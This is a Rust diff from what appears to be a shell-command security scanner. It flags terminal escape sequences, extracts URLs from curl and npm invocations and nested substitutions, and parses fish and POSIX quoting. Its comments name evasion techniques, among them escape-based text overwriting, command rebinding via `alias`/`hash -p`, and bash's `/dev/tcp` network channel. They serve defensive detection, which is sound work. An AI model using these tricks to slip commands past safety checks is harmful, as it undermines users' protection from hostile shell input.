@@ -412,6 +412,20 @@ pub fn scan_bytes_with_ignored_ranges(
                     i += 2;
                     continue;
                 }
+                // Any other ESC sequence is a terminal control too, and some
+                // rewrite the display without an introducer: `\e7` / `\e8`
+                // save and restore the cursor (text printed in between is
+                // overwritten), `\eM` moves it up a line, `\ec` resets.
+                accumulator.result.has_ansi_escapes = true;
+                accumulator.push_detail(
+                    ByteFindingClass::Ansi,
+                    ByteFinding {
+                        offset: i,
+                        byte: b,
+                        codepoint: None,
+                        description: "escape sequence".to_string(),
+                    },
+                );
             } else {
                 accumulator.result.has_ansi_escapes = true;
                 accumulator.push_detail(
@@ -1821,16 +1835,18 @@ pub(crate) fn strip_invisible(s: &str) -> String {
 pub fn extract_urls(input: &str, shell: ShellType) -> Vec<ExtractedUrl> {
     let extracted = extract_urls_depth(input, shell, 0);
     let mut deduplicated: Vec<ExtractedUrl> = Vec::new();
+    // First occurrence of each (segment, URL text), so thousands of URLs do
+    // not compare every candidate with every kept one (CORE-6).
+    let mut first_index: std::collections::HashMap<(usize, String), usize> =
+        std::collections::HashMap::new();
     for candidate in extracted {
-        let identity = candidate.parsed.raw_str();
-        if let Some(existing) = deduplicated.iter_mut().find(|existing| {
-            existing.segment_index == candidate.segment_index
-                && existing.parsed.raw_str() == identity
-        }) {
+        let key = (candidate.segment_index, candidate.parsed.raw_str());
+        if let Some(&index) = first_index.get(&key) {
             // Recursive inspection of a command substitution carries the true
             // nested sink context and must win over a raw fallback match.
-            existing.in_sink_context |= candidate.in_sink_context;
+            deduplicated[index].in_sink_context |= candidate.in_sink_context;
         } else {
+            first_index.insert(key, deduplicated.len());
             deduplicated.push(candidate);
         }
     }
@@ -1840,7 +1856,8 @@ pub fn extract_urls(input: &str, shell: ShellType) -> Vec<ExtractedUrl> {
 const MAX_SUBSTITUTION_DEPTH: usize = 8;
 
 fn extract_urls_depth(input: &str, shell: ShellType, depth: usize) -> Vec<ExtractedUrl> {
-    if depth > MAX_SUBSTITUTION_DEPTH {
+    // An exhausted budget is reported by the engine as incomplete analysis.
+    if depth > MAX_SUBSTITUTION_DEPTH || !charge_scan_work(input.len()) {
         return Vec::new();
     }
     let heredocs = (shell == ShellType::Posix).then(|| recover_posix_heredocs(input));
@@ -1868,6 +1885,8 @@ fn extract_urls_depth(input: &str, shell: ShellType, depth: usize) -> Vec<Extrac
 
     for (seg_idx, segment) in segments.iter().enumerate() {
         let sink_context = is_sink_context(segment, &segments, shell);
+        // Built on the first URL candidate of the segment, then shared by all.
+        let mut url_owners: Option<NestedUrlOwners<'_>> = None;
         let resolved = resolve_segment_command_for_shell(segment, shell);
         let curl_destinations = resolved
             .as_ref()
@@ -1973,20 +1992,20 @@ fn extract_urls_depth(input: &str, shell: ShellType, depth: usize) -> Vec<Extrac
             if !clean.is_empty() {
                 let first = results.len();
                 push_urls_from_source(&clean, shell, seg_idx, sink_context, &mut results);
-                for (index, candidate) in results.iter().enumerate().skip(first) {
-                    if curl_dns_body_owns_fallback(
-                        candidate,
-                        &clean,
-                        segment,
-                        input,
-                        shell,
-                        &nested_bodies,
-                    ) {
-                        deferred_fallbacks.insert(index);
+                if results.len() > first {
+                    let owners = url_owners.get_or_insert_with(|| {
+                        NestedUrlOwners::new(segment, input, shell, &nested_bodies)
+                    });
+                    let source = owners.for_source(&clean);
+                    for (index, candidate) in results.iter().enumerate().skip(first) {
+                        if source.owns(candidate) {
+                            deferred_fallbacks.insert(index);
+                        }
                     }
                 }
             }
         }
+        let curl_operand_index = curl_destinations.as_deref().map(CurlOperandIndex::new);
         for source in &url_sources {
             let first = results.len();
             push_urls_from_source_with_curl_operands(
@@ -1994,19 +2013,18 @@ fn extract_urls_depth(input: &str, shell: ShellType, depth: usize) -> Vec<Extrac
                 shell,
                 seg_idx,
                 sink_context,
-                curl_destinations.as_deref(),
+                curl_operand_index.as_ref(),
                 &mut results,
             );
-            for (index, candidate) in results.iter().enumerate().skip(first) {
-                if curl_dns_body_owns_fallback(
-                    candidate,
-                    source,
-                    segment,
-                    input,
-                    shell,
-                    &nested_bodies,
-                ) {
-                    deferred_fallbacks.insert(index);
+            if results.len() > first {
+                let owners = url_owners.get_or_insert_with(|| {
+                    NestedUrlOwners::new(segment, input, shell, &nested_bodies)
+                });
+                let source = owners.for_source(source);
+                for (index, candidate) in results.iter().enumerate().skip(first) {
+                    if source.owns(candidate) {
+                        deferred_fallbacks.insert(index);
+                    }
                 }
             }
         }
@@ -2030,7 +2048,9 @@ fn extract_urls_depth(input: &str, shell: ShellType, depth: usize) -> Vec<Extrac
                     _ => Vec::new(),
                 };
                 for raw in std::iter::once(&operand.text).chain(&expanded) {
-                    let parsed = if has_leading_uri_scheme(raw) {
+                    let parsed = if parse::curl_scheme_separator(raw).is_some()
+                        || has_leading_uri_scheme(raw)
+                    {
                         // curl also accepts schemes outside URL_REGEX's generic
                         // shortlist, including explicit scp:// and sftp:// URLs.
                         parse_curl_destination(raw)
@@ -2093,6 +2113,15 @@ fn extract_urls_depth(input: &str, shell: ShellType, depth: usize) -> Vec<Extrac
                         }
                     }
                     let clean = crate::rules::command::normalize_shell_token(arg, shell);
+                    if cmd.name == "npm"
+                        && shell == ShellType::Posix
+                        && literal_posix_npm_metadata_operand(&cmd.args) == Some(arg_idx)
+                    {
+                        if let Some(selector) = npm_named_url_selector(&clean) {
+                            push_urls_from_source(selector, shell, seg_idx, true, &mut results);
+                            continue;
+                        }
+                    }
                     if is_remote_copy {
                         // Validate the spec shape (for downstream policy) but
                         // never emit schemeless for remote specs or local files.
@@ -2219,112 +2248,285 @@ fn extract_urls_depth(input: &str, shell: ShellType, depth: usize) -> Vec<Extrac
     results
 }
 
-/// A raw wrapper/substitution scan can misread curl's DNS authority as an IP.
-/// Defer only that fallback to a recovered client occurrence. Equality of URL
-/// text alone is insufficient: a sibling wget or quoted data can legitimately
-/// retain generic parser semantics for exactly the same spelling.
-fn curl_dns_body_owns_fallback(
-    candidate: &ExtractedUrl,
-    source: &str,
-    segment: &Segment,
-    input: &str,
+/// Reconcile a raw wrapper/substitution fallback with its recovered occurrence.
+/// It may misread curl's DNS authority as an IP, or promote URI-looking remote
+/// path text into a new destination. Equal text in a sibling wget or data word
+/// does not establish ownership and keeps its independent reading.
+///
+/// What depends only on the nested bodies is computed once per segment, and
+/// what depends on the source word once per word: a word holding thousands
+/// of URLs (`python3 -c "$(echo URL…)"`) used to compare every candidate with
+/// every nested URL and re-read the whole body for each (CORE-6), which grew
+/// with the square of the word.
+struct NestedUrlOwners<'a> {
+    segment: &'a Segment,
     shell: ShellType,
-    nested_bodies: &[(ExecutableBody, Vec<ExtractedUrl>)],
-) -> bool {
-    let UrlLike::Standard { parsed, .. } = &candidate.parsed else {
-        return false;
-    };
-    if !matches!(parsed.host(), Some(url::Host::Ipv4(_)))
-        || parse::curl_empty_hex_dns_url_host(&candidate.raw).is_none()
-    {
-        return false;
-    }
-    nested_bodies.iter().any(|(body, urls)| {
-        let Some(origin) = &body.origin else {
-            return false;
-        };
-        if origin.parent_range.start < segment.byte_range.start
-            || origin.parent_range.end > segment.byte_range.end
-        {
-            return false;
+    bodies: Vec<NestedUrlOwner<'a>>,
+}
+
+struct NestedUrlOwner<'a> {
+    body: &'a ExecutableBody,
+    origin: &'a ExecutableBodyOrigin,
+    urls: &'a [ExtractedUrl],
+    /// The body's exact lexical span is retained and a `)` closes it.
+    closes_exact_body: bool,
+    /// Nested client URLs by their suffixes that start in the URL's path,
+    /// query or fragment, with where that tail starts.
+    path_suffixes: ShortSuffixIndex<'a, (&'a str, usize)>,
+    /// The input holds the body's exact text at its recorded span.
+    exact_span: bool,
+}
+
+/// [`NestedUrlOwners`] for one source word, with the word's facts computed
+/// on first use.
+struct SourceUrlOwners<'o, 'a> {
+    owners: &'o NestedUrlOwners<'a>,
+    source: &'o str,
+    normalized: std::cell::OnceCell<String>,
+    /// Where the (unique) source word starts in the segment.
+    start: std::cell::OnceCell<Option<usize>>,
+    /// Per body: the wrapper parser selected this unique complete code argv.
+    unique_wrapper_argv: Vec<std::cell::OnceCell<bool>>,
+}
+
+/// Strings indexed by each of their suffixes of at most
+/// [`ShortSuffixIndex::KEY_BYTES`] bytes. A string that ends with some text
+/// also ends with that text's own short suffix, so "which indexed strings may
+/// end with X" is one hash lookup instead of a scan of every string: URL
+/// extraction asks it once per URL candidate, and a word holding thousands of
+/// URLs made those scans quadratic (CORE-6).
+struct ShortSuffixIndex<'a, T> {
+    map: std::collections::HashMap<&'a str, Vec<T>>,
+}
+
+impl<'a, T> ShortSuffixIndex<'a, T> {
+    const KEY_BYTES: usize = 16;
+
+    fn new() -> Self {
+        Self {
+            map: std::collections::HashMap::new(),
         }
-        // URL_REGEX may include a command substitution's closing `)` in
-        // the URL path. Only an exact retained lexical span proves that this
-        // byte is shell syntax instead of part of the client's URL operand.
-        let closes_exact_body = input.get(origin.parent_range.clone()) == Some(body.input.as_str())
-            && input.as_bytes().get(origin.parent_range.end) == Some(&b')');
-        let comparable_raw = if closes_exact_body {
-            candidate.raw.strip_suffix(')').unwrap_or(&candidate.raw)
-        } else {
-            &candidate.raw
-        };
-        let has_client_authority = urls.iter().any(|url| {
-            let Some(host) = url.parsed.host() else {
-                return false;
+    }
+
+    /// Index `text` under its short suffixes that start at or after byte
+    /// `start` (a char boundary), the empty suffix included.
+    fn insert(&mut self, text: &'a str, start: usize, value: T)
+    where
+        T: Clone,
+    {
+        let mut offset = text.len();
+        loop {
+            self.map
+                .entry(&text[offset..])
+                .or_default()
+                .push(value.clone());
+            let Some((previous, _)) = text[start..offset].char_indices().last() else {
+                break;
             };
-            if parse::curl_empty_hex_dns_host(host).is_none() {
+            let previous = start + previous;
+            if text.len() - previous > Self::KEY_BYTES {
+                break;
+            }
+            offset = previous;
+        }
+    }
+
+    /// The values of every indexed string that may end with `suffix`.
+    fn candidates(&self, suffix: &str) -> &[T] {
+        let mut key_start = 0usize;
+        while suffix.len() - key_start > Self::KEY_BYTES {
+            key_start += suffix[key_start..].chars().next().map_or(1, char::len_utf8);
+        }
+        self.map
+            .get(&suffix[key_start..])
+            .map_or(&[], Vec::as_slice)
+    }
+}
+
+impl NestedUrlOwner<'_> {
+    /// Whether `comparable` is a suffix of a nested client URL that starts in
+    /// that URL's path, query or fragment.
+    fn owned_by_url_tail(&self, comparable: &str) -> bool {
+        self.path_suffixes
+            .candidates(comparable)
+            .iter()
+            .any(|(raw, tail_start)| {
+                raw.len()
+                    .checked_sub(comparable.len())
+                    .is_some_and(|offset| {
+                        offset >= *tail_start && raw.get(offset..) == Some(comparable)
+                    })
+            })
+    }
+}
+
+impl<'a> NestedUrlOwners<'a> {
+    fn new(
+        segment: &'a Segment,
+        input: &'a str,
+        shell: ShellType,
+        nested_bodies: &'a [(ExecutableBody, Vec<ExtractedUrl>)],
+    ) -> Self {
+        let bodies = nested_bodies
+            .iter()
+            .filter_map(|(body, urls)| {
+                let origin = body.origin.as_ref()?;
+                if origin.parent_range.start < segment.byte_range.start
+                    || origin.parent_range.end > segment.byte_range.end
+                {
+                    return None;
+                }
+                let exact_span =
+                    input.get(origin.parent_range.clone()) == Some(body.input.as_str());
+                // URL_REGEX may include a command substitution's closing `)`
+                // in the URL path. Only an exact retained lexical span proves
+                // that this byte is shell syntax instead of part of the
+                // client's URL operand.
+                let closes_exact_body =
+                    exact_span && input.as_bytes().get(origin.parent_range.end) == Some(&b')');
+                let mut path_suffixes = ShortSuffixIndex::new();
+                for url in urls {
+                    if url.parsed.host().is_none() {
+                        continue;
+                    }
+                    let tail_start = match &url.parsed {
+                        UrlLike::Scp { .. } => url.raw.find(':').map(|colon| colon + 1),
+                        _ => parse::curl_scheme_separator(&url.raw).and_then(|(colon, slashes)| {
+                            let authority_start = colon + 1 + slashes;
+                            url.raw[authority_start..]
+                                .find(['/', '?', '#'])
+                                .map(|end| authority_start + end)
+                        }),
+                    };
+                    if let Some(tail_start) = tail_start {
+                        path_suffixes.insert(&url.raw, tail_start, (url.raw.as_str(), tail_start));
+                    }
+                }
+                Some(NestedUrlOwner {
+                    body,
+                    origin,
+                    urls,
+                    closes_exact_body,
+                    path_suffixes,
+                    exact_span,
+                })
+            })
+            .collect();
+        Self {
+            segment,
+            shell,
+            bodies,
+        }
+    }
+
+    fn for_source<'o>(&'o self, source: &'o str) -> SourceUrlOwners<'o, 'a> {
+        SourceUrlOwners {
+            owners: self,
+            source,
+            normalized: std::cell::OnceCell::new(),
+            start: std::cell::OnceCell::new(),
+            unique_wrapper_argv: self
+                .bodies
+                .iter()
+                .map(|_| std::cell::OnceCell::new())
+                .collect(),
+        }
+    }
+}
+
+impl SourceUrlOwners<'_, '_> {
+    fn owns(&self, candidate: &ExtractedUrl) -> bool {
+        let segment = self.owners.segment;
+        let shell = self.owners.shell;
+        let dns_mismatch = matches!(&candidate.parsed, UrlLike::Standard { parsed, .. }
+            if matches!(parsed.host(), Some(url::Host::Ipv4(_)))
+                && parse::curl_empty_hex_dns_url_host(&candidate.raw).is_some());
+        self.owners.bodies.iter().enumerate().any(|(index, owner)| {
+            let comparable_raw = if owner.closes_exact_body {
+                candidate.raw.strip_suffix(')').unwrap_or(&candidate.raw)
+            } else {
+                &candidate.raw
+            };
+            let has_client_authority = owner.owned_by_url_tail(comparable_raw)
+                || (dns_mismatch
+                    && owner.urls.iter().any(|url| {
+                        let Some(host) = url.parsed.host() else {
+                            return false;
+                        };
+                        if parse::curl_empty_hex_dns_host(host).is_none() {
+                            return false;
+                        }
+                        if url.raw == comparable_raw {
+                            return true;
+                        }
+                        // URL_REGEX can see ftp:// inside a complete sftp://
+                        // operand. Suppress only a suffix beginning inside
+                        // that same URI scheme.
+                        let Some(scheme_end) = url.raw.find("://") else {
+                            return false;
+                        };
+                        url.raw
+                            .len()
+                            .checked_sub(comparable_raw.len())
+                            .is_some_and(|offset| {
+                                offset < scheme_end && url.raw.get(offset..) == Some(comparable_raw)
+                            })
+                    }));
+            if !has_client_authority {
                 return false;
             }
-            if url.raw == comparable_raw {
+            let body = owner.body;
+            let unique_wrapper_argv = *self.unique_wrapper_argv[index].get_or_init(|| {
+                owner.origin.relation == ExecutableRelation::WrapperReplacement
+                    && *self.normalized.get_or_init(|| {
+                        crate::rules::command::normalize_shell_token(self.source, shell)
+                    }) == body.input
+                    && segment
+                        .command
+                        .iter()
+                        .chain(segment.args.iter())
+                        .filter(|word| {
+                            crate::rules::command::normalize_shell_token(word, shell) == body.input
+                        })
+                        .count()
+                        == 1
+            });
+            if unique_wrapper_argv {
+                // The wrapper parser selected this unique complete code argv.
+                // Decoded/generated bodies do not need a guessed byte mapping.
                 return true;
             }
-            // URL_REGEX can see ftp:// inside a complete sftp:// operand.
-            // Suppress only a suffix beginning inside that same URI scheme.
-            let Some(scheme_end) = url.raw.find("://") else {
+            if !owner.exact_span {
+                return false; // no exact lexical child span was retained
+            }
+            let Some(source_start) = *self.start.get_or_init(|| {
+                let mut spans = segment.raw.match_indices(self.source);
+                match (spans.next(), spans.next()) {
+                    // Repeated source words have distinct ownership.
+                    (Some((start, _)), None) => Some(start),
+                    _ => None,
+                }
+            }) else {
                 return false;
             };
-            url.raw
-                .len()
-                .checked_sub(comparable_raw.len())
-                .is_some_and(|offset| {
-                    offset < scheme_end && url.raw.get(offset..) == Some(comparable_raw)
-                })
-        });
-        if !has_client_authority {
-            return false;
-        }
-        if origin.relation == ExecutableRelation::WrapperReplacement
-            && crate::rules::command::normalize_shell_token(source, shell) == body.input
-            && segment
-                .command
-                .iter()
-                .chain(segment.args.iter())
-                .filter(|word| {
-                    crate::rules::command::normalize_shell_token(word, shell) == body.input
-                })
-                .count()
-                == 1
-        {
-            // The wrapper parser selected this unique complete code argv.
-            // Decoded/generated bodies do not need a guessed byte mapping.
-            return true;
-        }
-        if input.get(origin.parent_range.clone()) != Some(body.input.as_str()) {
-            return false; // no exact lexical child span was retained
-        }
-        let mut source_spans = segment.raw.match_indices(source);
-        let Some((source_start, _)) = source_spans.next() else {
-            return false;
-        };
-        if source_spans.next().is_some() {
-            return false; // repeated source words have distinct ownership
-        }
-        let mut found = false;
-        for (offset, _) in source.match_indices(&candidate.raw) {
-            found = true;
-            let start = segment.byte_range.start + source_start + offset;
-            let end = start + candidate.raw.len();
-            let closing_delimiter = closes_exact_body
-                && comparable_raw.len() + 1 == candidate.raw.len()
-                && end == origin.parent_range.end + 1;
-            if start < origin.parent_range.start
-                || (end > origin.parent_range.end && !closing_delimiter)
-            {
-                return false;
+            let origin = owner.origin;
+            let mut found = false;
+            for (offset, _) in self.source.match_indices(&candidate.raw) {
+                found = true;
+                let start = segment.byte_range.start + source_start + offset;
+                let end = start + candidate.raw.len();
+                let closing_delimiter = owner.closes_exact_body
+                    && comparable_raw.len() + 1 == candidate.raw.len()
+                    && end == origin.parent_range.end + 1;
+                if start < origin.parent_range.start
+                    || (end > origin.parent_range.end && !closing_delimiter)
+                {
+                    return false;
+                }
             }
-        }
-        found
-    })
+            found
+        })
+    }
 }
 
 /// An extracted URL with context.
@@ -2554,6 +2756,14 @@ fn push_urls_from_source(
 /// including one host-unescape pass. Other encoded/trailing-dot numeric forms
 /// have version-dependent behavior and remain outside this correction.
 pub(crate) fn parse_curl_destination(raw: &str) -> parse::UrlLike {
+    let Some(normalized) = parse::normalize_curl_url(raw) else {
+        return parse::UrlLike::Unparsed {
+            raw: raw.to_string(),
+            raw_host: None,
+            raw_path: None,
+        };
+    };
+    let raw = normalized.as_ref();
     let mut value = parse::parse_url(raw);
     if let parse::UrlLike::Standard { parsed, .. } = &mut value {
         if let Some(host) = parse::curl_empty_hex_dns_url_host(raw) {
@@ -2610,7 +2820,7 @@ fn parse_curl_schemeless_destination(raw: &str, noise_heuristic: bool) -> Option
 /// Shared host view for operands already selected by curl's option grammar.
 /// Other clients keep their existing parser and policy normalization.
 pub(crate) fn curl_destination_host(raw: &str) -> Option<String> {
-    let value = if has_leading_uri_scheme(raw) {
+    let value = if parse::curl_scheme_separator(raw).is_some() || has_leading_uri_scheme(raw) {
         parse_curl_destination(raw)
     } else {
         parse_curl_schemeless_destination(raw, false)?
@@ -3148,12 +3358,39 @@ fn curl_glob_range(raw: &str, start: usize) -> Result<(Vec<String>, usize), Curl
     Ok((values, start + end))
 }
 
+/// A curl segment's URL operands, indexed once for every URL candidate of
+/// the segment (see [`ShortSuffixIndex`]).
+struct CurlOperandIndex<'a> {
+    /// Operand texts, for exact matches.
+    exact: std::collections::HashSet<&'a str>,
+    /// Operands with a URI scheme separator, by their short suffixes.
+    with_scheme: ShortSuffixIndex<'a, &'a str>,
+}
+
+impl<'a> CurlOperandIndex<'a> {
+    fn new(operands: &'a [crate::rules::command::FetchDestination]) -> Self {
+        let mut with_scheme = ShortSuffixIndex::new();
+        for operand in operands {
+            if parse::curl_scheme_separator(&operand.text).is_some() {
+                with_scheme.insert(&operand.text, 0, operand.text.as_str());
+            }
+        }
+        Self {
+            exact: operands
+                .iter()
+                .map(|operand| operand.text.as_str())
+                .collect(),
+            with_scheme,
+        }
+    }
+}
+
 fn push_urls_from_source_with_curl_operands(
     source: &str,
     shell: ShellType,
     segment_index: usize,
     in_sink_context: bool,
-    curl_operands: Option<&[crate::rules::command::FetchDestination]>,
+    curl_operands: Option<&CurlOperandIndex<'_>>,
     results: &mut Vec<ExtractedUrl>,
 ) {
     let normalized = crate::rules::command::normalize_shell_token(source, shell);
@@ -3163,28 +3400,23 @@ fn push_urls_from_source_with_curl_operands(
             if !has_leading_uri_scheme(&raw) {
                 continue;
             }
-            // A selected sftp:// operand also matches the generic regex at
-            // ftp://. The complete operand below is authoritative; suppress
-            // only a proven suffix of that same spelling, including attached
-            // --url= / -x values. Other embedded URL text keeps its old scan.
-            let starts_inside_operand_scheme = operands.iter().any(|operand| {
-                let operand = &operand.text;
-                if !has_leading_uri_scheme(operand) || operand.len() <= raw.len() {
-                    return false;
-                }
-                let suffix_start = operand.len() - raw.len();
-                let scheme_end = operand.find("://").unwrap();
-                suffix_start < scheme_end
-                    && operand.get(suffix_start..) == Some(raw.as_str())
-                    && normalized[..mat.start()].ends_with(&operand[..suffix_start])
-            });
-            if starts_inside_operand_scheme {
+            // A complete selected operand owns its URI-looking path text and
+            // any scheme suffix (`sftp://` also matches at `ftp://`). Attached
+            // --url= / -x values are included; independent data URLs stay visible.
+            let inside_complete_operand =
+                operands.with_scheme.candidates(&raw).iter().any(|operand| {
+                    if operand.len() <= raw.len() {
+                        return false;
+                    }
+                    let suffix_start = operand.len() - raw.len();
+                    operand.get(suffix_start..) == Some(raw.as_str())
+                        && normalized[..mat.start()].ends_with(&operand[..suffix_start])
+                });
+            if inside_complete_operand {
                 continue;
             }
         }
-        let url = if curl_operands
-            .is_some_and(|operands| operands.iter().any(|operand| operand.text == raw))
-        {
+        let url = if curl_operands.is_some_and(|operands| operands.exact.contains(raw.as_str())) {
             parse_curl_destination(&raw)
         } else {
             parse::parse_url(&raw)
@@ -3316,6 +3548,13 @@ fn shell_word_is_proven_literal(raw: &str, shell: ShellType) -> bool {
         let ch = chars[i];
         match quote {
             Quote::Single => {
+                if shell == ShellType::Fish
+                    && ch == '\\'
+                    && matches!(chars.get(i + 1), Some(&('\'' | '\\')))
+                {
+                    i += 2;
+                    continue;
+                }
                 if ch == '\'' {
                     if shell == ShellType::PowerShell
                         && chars.get(i + 1).is_some_and(|next| *next == '\'')
@@ -3395,6 +3634,11 @@ enum ShellLexQuote {
 enum ShellDelimiter {
     Paren,
     Brace,
+    /// A POSIX `${...}` parameter expansion. Unlike a brace group, whose `}`
+    /// is a reserved word that must start a word and end at a boundary, the
+    /// expansion ends at its first unquoted `}` (`"${v}"`, `${v:-x}`), and a
+    /// `#` inside it (`${#arr[@]}`, `${v#prefix}`) is not a comment.
+    Parameter,
 }
 
 impl ShellDelimiter {
@@ -3409,9 +3653,17 @@ impl ShellDelimiter {
     fn close(self) -> u8 {
         match self {
             Self::Paren => b')',
-            Self::Brace => b'}',
+            Self::Brace | Self::Parameter => b'}',
         }
     }
+}
+
+/// fish reads `\'` and `\\` as escapes inside single quotes; every other
+/// backslash there is literal. True when `bytes[index]` starts one.
+fn fish_single_quote_escape_byte_at(shell: ShellType, bytes: &[u8], index: usize) -> bool {
+    shell == ShellType::Fish
+        && bytes.get(index) == Some(&b'\\')
+        && matches!(bytes.get(index + 1), Some(b'\'' | b'\\'))
 }
 
 fn shell_escape_byte(shell: ShellType) -> u8 {
@@ -3683,11 +3935,18 @@ fn find_shell_delimiter_close(input: &str, open: usize, shell: ShellType) -> Opt
         return find_powershell_delimiter_close(input, open);
     }
     let bytes = input.as_bytes();
-    let initial = ShellDelimiter::from_open(*bytes.get(open)?)?;
+    let initial = match ShellDelimiter::from_open(*bytes.get(open)?)? {
+        ShellDelimiter::Brace
+            if shell == ShellType::Posix && bytes.get(open.wrapping_sub(1)) == Some(&b'$') =>
+        {
+            ShellDelimiter::Parameter
+        }
+        initial => initial,
+    };
     let mut frames = vec![(initial, ShellLexQuote::Normal)];
     let mut quote = ShellLexQuote::Normal;
     let mut in_comment = false;
-    let mut word_start = true;
+    let mut word_start = initial != ShellDelimiter::Parameter;
     let mut i = open + 1;
 
     while i < bytes.len() {
@@ -3703,6 +3962,10 @@ fn find_shell_delimiter_close(input: &str, open: usize, shell: ShellType) -> Opt
 
         match quote {
             ShellLexQuote::Single => {
+                if fish_single_quote_escape_byte_at(shell, bytes, i) {
+                    i += 2;
+                    continue;
+                }
                 if byte == b'\'' {
                     if shell == ShellType::PowerShell && bytes.get(i + 1) == Some(&b'\'') {
                         i += 2;
@@ -3730,7 +3993,12 @@ fn find_shell_delimiter_close(input: &str, open: usize, shell: ShellType) -> Opt
                     if frames.len() >= MAX_SHELL_DELIMITER_DEPTH {
                         return None;
                     }
-                    let nested = ShellDelimiter::from_open(bytes[i + 1])?;
+                    let nested = match ShellDelimiter::from_open(bytes[i + 1])? {
+                        ShellDelimiter::Brace if shell == ShellType::Posix => {
+                            ShellDelimiter::Parameter
+                        }
+                        nested => nested,
+                    };
                     frames.push((nested, ShellLexQuote::Double));
                     quote = ShellLexQuote::Normal;
                     i += 2;
@@ -3746,7 +4014,10 @@ fn find_shell_delimiter_close(input: &str, open: usize, shell: ShellType) -> Opt
             ShellLexQuote::Normal => {}
         }
 
-        if starts_shell_line_comment(bytes, i, shell, word_start) {
+        let in_parameter = frames
+            .last()
+            .is_some_and(|(delimiter, _)| *delimiter == ShellDelimiter::Parameter);
+        if !in_parameter && starts_shell_line_comment(bytes, i, shell, word_start) {
             in_comment = true;
             i += 1;
             continue;
@@ -3775,9 +4046,12 @@ fn find_shell_delimiter_close(input: &str, open: usize, shell: ShellType) -> Opt
             continue;
         }
         if let Some(nested) = ShellDelimiter::from_open(byte) {
+            let parameter = shell == ShellType::Posix
+                && nested == ShellDelimiter::Brace
+                && bytes.get(i.wrapping_sub(1)) == Some(&b'$');
             if shell == ShellType::Posix
                 && nested == ShellDelimiter::Brace
-                && !(bytes.get(i.wrapping_sub(1)) == Some(&b'$')
+                && !(parameter
                     || (word_start && posix_reserved_word_right_boundary(bytes.get(i + 1))))
             {
                 word_start = false;
@@ -3787,8 +4061,15 @@ fn find_shell_delimiter_close(input: &str, open: usize, shell: ShellType) -> Opt
             if frames.len() >= MAX_SHELL_DELIMITER_DEPTH {
                 return None;
             }
-            frames.push((nested, ShellLexQuote::Normal));
-            word_start = true;
+            frames.push((
+                if parameter {
+                    ShellDelimiter::Parameter
+                } else {
+                    nested
+                },
+                ShellLexQuote::Normal,
+            ));
+            word_start = !parameter;
             i += 1;
             continue;
         }
@@ -3821,6 +4102,68 @@ fn find_shell_delimiter_close(input: &str, open: usize, shell: ShellType) -> Opt
         i += 1;
     }
     None
+}
+
+/// The command substitutions one fish word runs, in order: `(...)` and
+/// `$(...)` outside quotes and `$(...)` inside double quotes (fish 3.4+).
+/// Single-quoted and escaped text runs nothing. `None` when a substitution
+/// does not close.
+pub(crate) fn fish_word_command_substitutions(raw: &str) -> Option<Vec<String>> {
+    let bytes = raw.as_bytes();
+    let mut bodies = Vec::new();
+    let mut quote = ShellLexQuote::Normal;
+    let mut index = 0usize;
+    while index < bytes.len() {
+        let byte = bytes[index];
+        let open = match quote {
+            ShellLexQuote::Single => {
+                if fish_single_quote_escape_byte_at(ShellType::Fish, bytes, index) {
+                    index += 2;
+                    continue;
+                }
+                if byte == b'\'' {
+                    quote = ShellLexQuote::Normal;
+                }
+                None
+            }
+            ShellLexQuote::Double => match byte {
+                b'\\' => {
+                    index += 2;
+                    continue;
+                }
+                b'"' => {
+                    quote = ShellLexQuote::Normal;
+                    None
+                }
+                b'$' if bytes.get(index + 1) == Some(&b'(') => Some(index + 1),
+                _ => None,
+            },
+            ShellLexQuote::Normal => match byte {
+                b'\\' => {
+                    index += 2;
+                    continue;
+                }
+                b'\'' => {
+                    quote = ShellLexQuote::Single;
+                    None
+                }
+                b'"' => {
+                    quote = ShellLexQuote::Double;
+                    None
+                }
+                b'(' => Some(index),
+                _ => None,
+            },
+        };
+        let Some(open) = open else {
+            index += 1;
+            continue;
+        };
+        let close = find_substitution_close(raw, open, ShellType::Fish)?;
+        bodies.push(raw.get(open + 1..close)?.to_string());
+        index = close + 1;
+    }
+    Some(bodies)
 }
 
 fn find_substitution_close(input: &str, open: usize, shell: ShellType) -> Option<usize> {
@@ -3891,7 +4234,13 @@ fn posix_arithmetic_is_numeric(raw: &str, depth: usize, remaining: &mut usize) -
             if !posix_arithmetic_is_numeric(body, depth + 1, remaining) {
                 return false;
             }
-        } else if !posix_substitution_has_fixed_numeric_output(body) {
+        } else if enclosing_shell_state().rebinds_commands
+            || !posix_substitution_has_fixed_numeric_output(body)
+        {
+            // The fixed-output proof trusts `nproc`, `getconf`, `wc`, ... by
+            // name; text that may rebind a name (`alias nproc=...`, `hash -p
+            // /bin/sh nproc`, a PATH change) in this input or an enclosing
+            // one (see `ShellStateScope`) voids it.
             return false;
         }
         index = close + 1;
@@ -3925,13 +4274,76 @@ fn posix_substitution_has_fixed_numeric_output(body: &str) -> bool {
     else {
         return false;
     };
-    if matches!(command.as_str(), "date" | "/bin/date" | "/usr/bin/date") {
+    let fixed = |name: &str| {
+        command == name
+            || ["/bin/", "/usr/bin/", "/sbin/", "/usr/sbin/"]
+                .iter()
+                .any(|prefix| command.strip_prefix(prefix) == Some(name))
+    };
+    if fixed("date") {
         return args == ["+%s"];
     }
-    if !matches!(
-        command.as_str(),
-        "printf" | "/bin/printf" | "/usr/bin/printf"
-    ) {
+    // Processor counts and fixed system constants print one decimal number.
+    if fixed("nproc") {
+        return args.is_empty() || args == ["--all"];
+    }
+    if fixed("getconf") {
+        return matches!(
+            args.as_slice(),
+            [name] if matches!(
+                name.as_str(),
+                "_NPROCESSORS_ONLN"
+                    | "NPROCESSORS_ONLN"
+                    | "_NPROCESSORS_CONF"
+                    | "NPROCESSORS_CONF"
+                    | "PAGESIZE"
+                    | "PAGE_SIZE"
+                    | "ARG_MAX"
+                    | "LONG_BIT"
+                    | "CLK_TCK"
+            )
+        );
+    }
+    if fixed("sysctl") {
+        return matches!(
+            args.as_slice(),
+            [flag, key] if flag == "-n" && matches!(
+                key.as_str(),
+                "hw.ncpu"
+                    | "hw.logicalcpu"
+                    | "hw.physicalcpu"
+                    | "hw.activecpu"
+                    | "hw.logicalcpu_max"
+                    | "hw.physicalcpu_max"
+                    | "hw.memsize"
+                    | "hw.pagesize"
+            )
+        );
+    }
+    // `wc -l < file` prints only the count; with a file operand it also
+    // prints the name, which arithmetic would read as an expression.
+    if fixed("wc") {
+        // bash reads `/dev/tcp/HOST/PORT` from the network.
+        let target_ok = |target: &str| {
+            !target.is_empty()
+                && !target.starts_with(['(', '&', '<', '>', '|'])
